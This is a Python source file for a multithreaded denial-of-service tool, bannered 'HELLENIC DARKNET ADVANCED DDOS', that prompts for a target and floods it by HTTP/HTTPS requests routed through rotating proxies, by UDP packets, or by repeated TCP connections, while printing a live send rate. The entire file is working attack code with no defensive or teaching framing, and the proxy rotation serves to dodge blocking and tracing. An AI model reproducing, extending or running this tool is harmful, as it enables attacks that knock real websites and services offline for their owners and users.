import threading
import requests
import socket
import random
import time
import os
from rich.console import Console
from rich.prompt import Prompt

console = Console()

console.print("[bold red]\n[ HELLENIC DARKNET ADVANCED DDOS ][/bold red]")
console.print("[green]Made by: 0xBL4CKH4T[/green]\n")

stop_flag = False
success_count = 0

# Φορτώνουμε proxies αν υπάρχουν
def load_proxies(path="payloads/proxies.txt"):
    proxies = []
    if os.path.exists(path):
        with open(path, "r") as f:
            for line in f:
                line=line.strip()
                if line:
                    proxies.append(line)
    else:
        console.print(f"[yellow]Proxy list not found at {path}. Continuing without proxies.[/yellow]")
    return proxies

# HTTP/HTTPS flood με proxies
def http_flood(url, proxies, threads):
    global stop_flag, success_count

    def worker():
        global success_count
        session = requests.Session()
        while not stop_flag:
            proxy = None
            if proxies:
                proxy_addr = random.choice(proxies)
                proxy = {
                    "http": f"http://{proxy_addr}",
                    "https": f"http://{proxy_addr}"
                }
            try:
                resp = session.get(url, proxies=proxy, timeout=5)
                success_count += 1
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    monitor()

# UDP flood
def udp_flood(target_ip, target_port, threads):
    global stop_flag, success_count
    packet = random._urandom(1024)

    def worker():
        global success_count
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_flag:
            try:
                sock.sendto(packet, (target_ip, target_port))
                success_count += 1
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    monitor()

# TCP flood
def tcp_flood(target_ip, target_port, threads):
    global stop_flag, success_count
    packet = random._urandom(1024)

    def worker():
        global success_count
        while not stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(packet)
                sock.close()
                success_count += 1
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    monitor()

def monitor():
    global stop_flag, success_count
    try:
        prev = 0
        while not stop_flag:
            time.sleep(1)
            current = success_count
            rate = current - prev
            prev = current
            console.print(f"[cyan]Packets sent: {current} | Rate: {rate}/sec[/cyan]", end="\r")
    except KeyboardInterrupt:
        stop_flag = True
        console.print("\n[red]Stopping attack...[/red]")
        time.sleep(1)

def main():
    global stop_flag, success_count

    console.print("Select attack type:")
    console.print("1) HTTP/HTTPS Flood (with proxy support)")
    console.print("2) UDP Flood")
    console.print("3) TCP Flood")

    choice = Prompt.ask("Choice", choices=["1","2","3"])

    if choice == "1":
        url = Prompt.ask("Enter target URL (include http:// or https://)").strip()
        threads = int(Prompt.ask("Number of threads", default="10"))
        proxies = load_proxies()
        console.print(f"Loaded {len(proxies)} proxies.")
        success_count = 0
        stop_flag = False
        http_flood(url, proxies, threads)

    elif choice == "2":
        target_ip = Prompt.ask("Enter target IP").strip()
        target_port = int(Prompt.ask("Enter target port", default="80"))
        threads = int(Prompt.ask("Number of threads", default="10"))
        success_count = 0
        stop_flag = False
        udp_flood(target_ip, target_port, threads)

    elif choice == "3":
        target_ip = Prompt.ask("Enter target IP").strip()
        target_port = int(Prompt.ask("Enter target port", default="80"))
        threads = int(Prompt.ask("Number of threads", default="10"))
        success_count = 0
        stop_flag = False
        tcp_flood(target_ip, target_port, threads)

if __name__ == "__main__":
    main()
